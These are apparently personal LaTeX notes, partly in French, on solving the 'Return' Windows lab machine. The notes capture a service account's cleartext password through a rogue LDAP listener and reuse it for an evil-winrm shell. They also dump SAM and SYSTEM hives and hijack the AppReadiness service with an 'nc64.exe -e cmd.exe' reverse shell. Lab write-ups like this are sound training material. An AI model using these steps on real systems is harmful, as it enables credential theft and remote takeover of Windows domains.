\chapter{Return [Windows:Easy]}
\begin{itemize}
    \item {\bf technics}: \gls{t:abusing-built-in-privesc}
    \item {\bf Components}: http  
    \item {\bf tools}: nc, ldapsearch, evil-winrm, nc64.exe, net.exe, sc.exe 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{initial discovery}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC 10.10.11.108

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 05:09 CEST
Nmap scan report for 10.10.11.108
Host is up (0.083s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-12 03:28:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 18m33s
| smb2-time:
|   date: 2022-09-12T03:28:15
|_  start_date: N/A
\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
$ enum4linux-ng -A $T_IP -u anonymous -p pass

 ===========================================================
|    Domain Information via SMB session for 10.10.11.108    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: PRINTER
NetBIOS domain name: RETURN
DNS domain: return.local
FQDN: printer.return.local
Derived membership: domain member
Derived domain: RETURN

\end{verbatim}

pas de shares visibles

\subsubsection{dns}

\begin{verbatim}
$ dig @printer.return.local any return.local
\end{verbatim}
rien de plus ni même en \verb+axfr+

\subsubsection{http}
\begin{verbatim}
$ ffuf -u http://printer.return.local -H 'Host: FUZZ.return.local' 
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ 
    -fs 28274
\end{verbatim}

visiblement une page qui met à jour ldap. On essaie d'envoyer sur un
\verb+nc -lnvp 4444+ mais on ne recoit rien.

en regardant la requete seul la target est parametrable
\begin{verbatim}
POST /settings.php HTTP/1.1
Host: printer.return.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://printer.return.local
DNT: 1
Connection: close
Referer: http://printer.return.local/settings.php
Upgrade-Insecure-Requests: 1

ip=printer.return.local
\end{verbatim}

donc
\begin{verbatim}
$ sudo nc -lnvp 389

Listening on 0.0.0.0 389
Connection received on 10.10.11.108 64820
0*`%return\svc-printer
                      1edFg43012!!
\end{verbatim}


\subsection{Credentialized discovery}

\subsubsection{ldap}
\begin{verbatim}
 ldapsearch -x -H ldap://printer.return.local \
    -D 'return\svc-printer' -w '1edFg43012!!' \
    -b "DC=return,DC=local" > ldap.dump
\end{verbatim}


\subsubsection{smb}

\begin{verbatim}
$ enum4linux-ng -A printer.return.local -u svc-printer -p '1edFg43012!!'

 =============================================
|    Users via RPC on printer.return.local    |
 =============================================
[*] Enumerating users via 'querydispinfo'
[+] Found 4 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 4 user(s) via 'enumdomusers'
[+] After merging user results we have 4 user(s) total:
'1103':
  username: svc-printer
  name: SVCPrinter
  acb: '0x00000210'
  description: Service Account for Printer
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account

 ==============================================
|    Shares via RPC on printer.return.local    |
 ==============================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: OK, Listing: OK
[*] Testing share C$
[+] Mapping: OK, Listing: OK
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK

 =================================================
|    Policies via RPC for printer.return.local    |
 =================================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: true
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

 =================================================
|    Printers via RPC for printer.return.local    |
 =================================================
[+] Found 2 printer(s):
\\PRINTER.RETURN.LOCAL\Microsoft Print to PDF:
  description: \\PRINTER.RETURN.LOCAL\Microsoft Print to PDF,Microsoft Print To PDF,
  comment: ''
  flags: '0x800000'
\\PRINTER.RETURN.LOCAL\Microsoft XPS Document Writer:
  description: \\PRINTER.RETURN.LOCAL\Microsoft XPS Document Writer,Microsoft XPS Document Writer v4,
  comment: ''
  flags: '0x800000'
\end{verbatim}

\subsubsection{winrm}


\begin{verbatim}
$ evil-winrm -i printer.return.local -u svc-printer -p '1edFg43012!!'
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents>
\end{verbatim}

on trouve donc le user flag

\subsection{Priv Esc}

\begin{verbatim}

 this device has been disabled.
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
\end{verbatim}

a prirori on se dit que l'on va utiliser le \verb+SeLoadDriverPrivilege+ mais
supposé ne plus marcher depuis la version \verb+1803+ et on est en version
\verb+1809+

on va donc essayer d'abord \verb+seBackupPrivilege+

\subsubsection{Abusing Buil-in: Server Operators}
\begin{verbatim}
Command
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
The operation completed successfully.

The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> download SAM /tmp/SAM
Info: Downloading SAM to /tmp/SAM


Info: Download successful!

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> download SYSTEM /tmp/SYSTEM
Info: Downloading SYSTEM to /tmp/SYSTEM


Info: Download successful!
\end{verbatim}

ca ne marche pas on va donc rechercher un service a exploiter
\verb+Get-Process+ ne marche pas pas plus que \verb+tasklist.exe /svc+ ou
encore \verb+sc.exe query type=service+ meme en uploadant \verb+psservice+ ca
ne passe pas.


par contre avec la commande \verb+services+ de winrm on en chope quelques un
\begin{verbatim}
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service
----                                                                                                                 ---------- -------
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc WdNisSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WdNisSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Windows Defender Antivirus Network Inspection Service
        DEPENDENCIES       : WdNisDrv
        SERVICE_START_NAME : NT AUTHORITY\LocalService
\end{verbatim}
mais ca ne marche pas et en plus ils sont en \verb+.NT AUTHORITY\LocalService+

On va essayer des services connus \verb+vss+
\verb+AppReadiness+ ils sont en \verb+LocalSystem+. On upload un \verb+nc64.exe+

\begin{verbatim}
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config AppReadiness
    binPath="PATH\nc64.exe -e cmd.exe IP PORT"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start AppReadiness
\end{verbatim}



\section{Theorie}


